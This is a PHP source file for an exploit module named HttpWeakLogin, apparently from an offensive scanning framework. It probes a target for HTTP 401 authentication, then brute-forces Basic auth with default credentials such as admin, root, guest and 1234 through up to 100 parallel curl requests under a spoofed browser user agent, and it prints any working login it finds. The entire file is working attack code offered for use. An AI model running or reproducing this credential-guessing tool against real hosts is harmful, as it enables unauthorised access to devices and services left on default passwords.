<?php
class HttpWeakLogin extends Exploit {

	function run(){
		//Check for 401 Auth code
		$code = $this->checkAuth($this->host->ipAdress);
		if($code==401){
			//Curl Multi Handler
			$curl_options = array(
			    CURLOPT_USERAGENT => 'Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405',
				CURLOPT_NOBODY => true,
			);
			$parallel_curl = new ParallelCurl(100, $curl_options);
			//Logins
			$logins = array("", "admin", "1234", "root", "guest");
			//Password
			$passwords = array("", "admin", "1234", "root", "guest");
			foreach($logins as $login){
				foreach($passwords as $password){
					$auth = $login . ":" . $password;
					//echoCli("Trying to login with: ".$auth, "notice");
				    $parallel_curl->startRequest($this->host->ipAdress, array($this, 'checkLogin'), $auth, null, $auth);					
				}
			}
			//Got Milk?
			if($this->data){
				$this->status = 1;
				return true;
			}
			$parallel_curl->finishAllRequests();
		}else{
			echoCli("Target not Vulnerable", "failure");
		}
	}

	function checkLogin($content, $url, $ch, $auth){
		$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	    if($code && $code!=401){
	        echoCli("Login found! ".$auth, "success");
			$this->data = $auth;
	    }
	}

	function checkAuth($host){
		$ch = curl_init($host);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405');
		curl_setopt($ch, CURLOPT_NOBODY, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);
		curl_exec($ch);
		$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);
		return $code;
	}
}
?>